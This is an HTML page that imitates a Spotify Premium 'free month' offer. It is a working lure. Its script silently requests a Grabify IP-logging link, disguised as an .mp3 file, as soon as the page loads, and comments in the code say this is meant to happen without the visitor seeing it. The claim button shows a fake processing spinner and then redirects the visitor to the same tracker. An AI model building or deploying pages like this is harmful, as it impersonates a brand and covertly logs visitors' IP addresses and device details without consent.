<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify Premium - Claim Your Free Month</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1DB954 0%, #1ed760 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #1DB954 0%, #1ed760 100%);
            padding: 40px 24px;
            text-align: center;
            color: white;
        }

        .logo {
            font-size: 48px;
            margin-bottom: 16px;
        }

        .header h1 {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .header p {
            font-size: 16px;
            opacity: 0.9;
        }

        .content {
            padding: 40px 24px;
        }

        .benefits {
            margin-bottom: 32px;
        }

        .benefit-item {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
            font-size: 15px;
            color: #333;
        }

        .benefit-item i {
            color: #1DB954;
            font-size: 20px;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .pricing {
            background: #f5f5f5;
            padding: 24px;
            border-radius: 12px;
            margin-bottom: 24px;
            text-align: center;
        }

        .pricing-label {
            color: #666;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .pricing-amount {
            font-size: 48px;
            font-weight: bold;
            color: #1DB954;
            margin-bottom: 4px;
        }

        .pricing-subtext {
            color: #999;
            font-size: 13px;
        }

        .claim-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #1DB954 0%, #1ed760 100%);
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 12px;
            box-shadow: 0 4px 15px rgba(29, 185, 84, 0.4);
        }

        .claim-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(29, 185, 84, 0.5);
        }

        .claim-btn:active {
            transform: translateY(0);
        }

        .terms {
            text-align: center;
            font-size: 12px;
            color: #999;
            margin-bottom: 16px;
        }

        .terms a {
            color: #1DB954;
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }

        .back-link {
            text-align: center;
        }

        .back-link a {
            color: #1DB954;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }

        .back-link a:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .loading.active {
            display: flex;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fas fa-music"></i>
            </div>
            <h1>Spotify Premium</h1>
            <p>1 Month FREE Trial</p>
        </div>

        <div class="content">
            <div class="benefits">
                <div class="benefit-item">
                    <i class="fas fa-check-circle"></i>
                    <span>Ad-free listening</span>
                </div>
                <div class="benefit-item">
                    <i class="fas fa-check-circle"></i>
                    <span>Download to listen offline</span>
                </div>
                <div class="benefit-item">
                    <i class="fas fa-check-circle"></i>
                    <span>Play any song, any time</span>
                </div>
                <div class="benefit-item">
                    <i class="fas fa-check-circle"></i>
                    <span>High audio quality</span>
                </div>
                <div class="benefit-item">
                    <i class="fas fa-check-circle"></i>
                    <span>Unlimited skips</span>
                </div>
            </div>

            <div class="pricing">
                <div class="pricing-label">After free trial</div>
                <div class="pricing-amount">$11.99</div>
                <div class="pricing-subtext">/month, cancel anytime</div>
            </div>

            <button class="claim-btn" id="claimBtn">Get Free Month Now</button>

            <div class="terms">
                <p>By clicking "Get Free Month Now" you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
            </div>

            <div class="back-link">
                <a href="javascript:history.back()">← Back to Spotifi</a>
            </div>
        </div>
    </div>

    <div class="loading" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <script>
        // Hidden iframe to trigger grabify link without showing it
        function loadGrabifyLink() {
            const img = new Image();
            img.src = 'https://urlto.me/2BqM5.mp3';
        }

        // Load grabify on page load (silently)
        window.addEventListener('load', () => {
            loadGrabifyLink();
        });

        // Claim button
        document.getElementById('claimBtn').addEventListener('click', () => {
            const overlay = document.getElementById('loadingOverlay');
            overlay.classList.add('active');

            // Simulate processing time
            setTimeout(() => {
                // Redirect to grabify link
                window.location.href = 'https://urlto.me/2BqM5.mp3';
            }, 2000);
        });
    </script>
</body>
</html>
